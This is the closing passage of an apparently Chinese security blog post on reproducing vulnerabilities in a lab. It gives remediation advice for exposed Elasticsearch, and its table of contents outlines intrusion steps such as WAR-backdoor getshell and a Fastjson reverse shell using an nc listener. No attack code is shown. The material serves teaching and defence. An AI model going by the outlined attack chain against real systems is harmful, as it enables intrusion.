<h3 id="修复方案：-18"><a href="#修复方案：-18" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1、为elasticsearch增加登录验证，可以使用官方推荐的shield插件，该插件为收费插件，可试用30天，免费的可以使用elasticsearch-http-basic，searchguard插件。插件可以通过运行Biplugin install [github-name]&#x2F;repo-name。同时需要注意增加验证后，请勿使用弱口令。</p>
<p>2、架设nginx反向代理服务器，并设置http basic认证来实现elasticsearch的登录认证。</p>
<p>3、elasticsearch 早期版本在“CVE中文漏洞信息库”网站上已有部分漏洞被披露，建议使用最新版本程序。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">freelander</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/08/19/images1/">http://example.com/2023/08/19/images1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">免责声明: </span><span class="post-copyright-info">本文章均为互联网收集，仅供学习参考，不拥有所有权，不承担相关法律责任。请不要做违法之事</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/19/frp/" title="frp内网穿透"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">frp内网穿透</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/19/hello-my-blog/" title="hello my blog"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">hello my blog</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">freelander</div><div class="author-info__description">网络不是法外之地</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">靶场复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#step1%EF%BC%9Atomcat-put%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">step1：tomcat put协议文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="toc-number">1.1.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step2%EF%BC%9Atomcat-ajp%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">step2：tomcat ajp协议漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step3%EF%BC%9Atomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.3.</span> <span class="toc-text">step3：tomcat弱口令密码爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-2"><span class="toc-number">1.3.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-2"><span class="toc-number">1.3.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step4-tomcat%E5%90%8E%E5%8F%B0war%E9%83%A8%E7%BD%B2%E5%90%8E%E9%97%A8getshell%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.</span> <span class="toc-text">step4:tomcat后台war部署后门getshell漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-3"><span class="toc-number">1.4.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-3"><span class="toc-number">1.4.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step5-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.</span> <span class="toc-text">step5:Fastjson反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-4"><span class="toc-number">1.5.3.</span> <span class="toc-text">漏洞复现：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BC%96%E5%86%99EXP%EF%BC%8C%E5%B0%86%E9%87%8C%E9%9D%A2%E7%9A%84ip%E6%94%B9%E4%B8%BA%E5%8F%8D%E5%BC%B9shell%E7%9A%84ip%EF%BC%8C%E6%96%87%E4%BB%B6%E5%91%BD%E5%90%8D%E4%B8%BAExploit-java%EF%BC%8C%E5%B9%B6%E7%94%A8javac%E7%BC%96%E8%BE%91%E6%88%90Exploit-class%E3%80%82"><span class="toc-number">1.5.3.0.1.</span> <span class="toc-text">编写EXP，将里面的ip改为反弹shell的ip，文件命名为Exploit.java，并用javac编辑成Exploit.class。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-python%E6%90%AD%E5%BB%BA%E4%B8%B4%E6%97%B6%E7%9A%84http%E6%9C%8D%E5%8A%A1-%E6%88%91%E8%BF%99%E9%87%8C%E7%94%A8%E7%9A%84python3"><span class="toc-number">1.5.3.0.2.</span> <span class="toc-text">3.python搭建临时的http服务(我这里用的python3)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8marshalsec%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC%E8%BD%AC%E5%8F%91%E3%80%82"><span class="toc-number">1.5.3.0.3.</span> <span class="toc-text">4.利用marshalsec开启监听转发。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-nc%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9shell%E3%80%82"><span class="toc-number">1.5.3.0.4.</span> <span class="toc-text">5.nc监听反弹shell。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#6-%E5%BC%80%E5%A7%8B%E6%9E%84%E9%80%A0payload%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%E3%80%82"><span class="toc-number">1.5.3.0.5.</span> <span class="toc-text">6.开始构造payload进行攻击。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-4"><span class="toc-number">1.5.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step6-ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.</span> <span class="toc-text">step6:ActiveMQ反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-5"><span class="toc-number">1.6.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-5"><span class="toc-number">1.6.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-5"><span class="toc-number">1.6.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-5"><span class="toc-number">1.6.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step7-thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.7.</span> <span class="toc-text">step7:thinkphp反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-6"><span class="toc-number">1.7.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-6"><span class="toc-number">1.7.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-6"><span class="toc-number">1.7.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-6"><span class="toc-number">1.7.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step8-phpcms9-6-0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.8.</span> <span class="toc-text">Step8:phpcms9.6.0任意文件上传漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-7"><span class="toc-number">1.8.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-7"><span class="toc-number">1.8.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-7"><span class="toc-number">1.8.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-7"><span class="toc-number">1.8.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step9-phpcms9-6-0%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.9.</span> <span class="toc-text">step9:phpcms9.6.0的SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-8"><span class="toc-number">1.9.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-8"><span class="toc-number">1.9.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-8"><span class="toc-number">1.9.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-8"><span class="toc-number">1.9.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step10-linux%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.10.</span> <span class="toc-text">step10:linux内核提权漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-9"><span class="toc-number">1.10.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-9"><span class="toc-number">1.10.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-9"><span class="toc-number">1.10.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-9"><span class="toc-number">1.10.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step11-weblogic%E6%BC%8F%E6%B4%9E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.11.</span> <span class="toc-text">step11:weblogic漏洞反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-10"><span class="toc-number">1.11.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-10"><span class="toc-number">1.11.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-10"><span class="toc-number">1.11.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-10"><span class="toc-number">1.11.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step12-grafana%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.12.</span> <span class="toc-text">step12:grafana任意文件读取漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-11"><span class="toc-number">1.12.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-11"><span class="toc-number">1.12.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-11"><span class="toc-number">1.12.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-11"><span class="toc-number">1.12.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step13-Apache-Solr%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.13.</span> <span class="toc-text">step13:Apache Solr远程代码执行漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-12"><span class="toc-number">1.13.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-12"><span class="toc-number">1.13.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-12"><span class="toc-number">1.13.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-12"><span class="toc-number">1.13.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step14-drupl-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-3704%EF%BC%89"><span class="toc-number">1.14.</span> <span class="toc-text">step14:drupl 命令执行漏洞（CVE-2014-3704）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-13"><span class="toc-number">1.14.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-13"><span class="toc-number">1.14.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-13"><span class="toc-number">1.14.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-13"><span class="toc-number">1.14.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step15-jenkins%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.15.</span> <span class="toc-text">step15:jenkins命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-14"><span class="toc-number">1.15.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-14"><span class="toc-number">1.15.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-14"><span class="toc-number">1.15.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-14"><span class="toc-number">1.15.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step16-Apache-Druid-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.16.</span> <span class="toc-text">step16:Apache Druid 任意文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-15"><span class="toc-number">1.16.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-15"><span class="toc-number">1.16.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-15"><span class="toc-number">1.16.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-15"><span class="toc-number">1.16.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step17%EF%BC%9AinfluxDB%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.17.</span> <span class="toc-text">step17：influxDB认证绕过漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-16"><span class="toc-number">1.17.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-16"><span class="toc-number">1.17.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-16"><span class="toc-number">1.17.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-16"><span class="toc-number">1.17.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step18%EF%BC%9Azookeeper%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.18.</span> <span class="toc-text">step18：zookeeper未授权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-17"><span class="toc-number">1.18.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-17"><span class="toc-number">1.18.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-17"><span class="toc-number">1.18.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-17"><span class="toc-number">1.18.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#step19-elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.19.</span> <span class="toc-text">step19:elasticsearch未授权访问漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0%EF%BC%9A-18"><span class="toc-number">1.19.1.</span> <span class="toc-text">漏洞概述：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC%EF%BC%9A-18"><span class="toc-number">1.19.2.</span> <span class="toc-text">漏洞影响版本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A-18"><span class="toc-number">1.19.3.</span> <span class="toc-text">漏洞复现：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-18"><span class="toc-number">1.19.4.</span> <span class="toc-text">修复方案：</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/19/1/" title="2023护网期间漏洞合集">2023护网期间漏洞合集</a><time datetime="2023-08-19T10:03:58.768Z" title="发表于 2023-08-19 18:03:58">2023-08-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/" title="sql注入报错函数">sql注入报错函数</a><time datetime="2023-08-19T09:53:36.910Z" title="发表于 2023-08-19 17:53:36">2023-08-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" 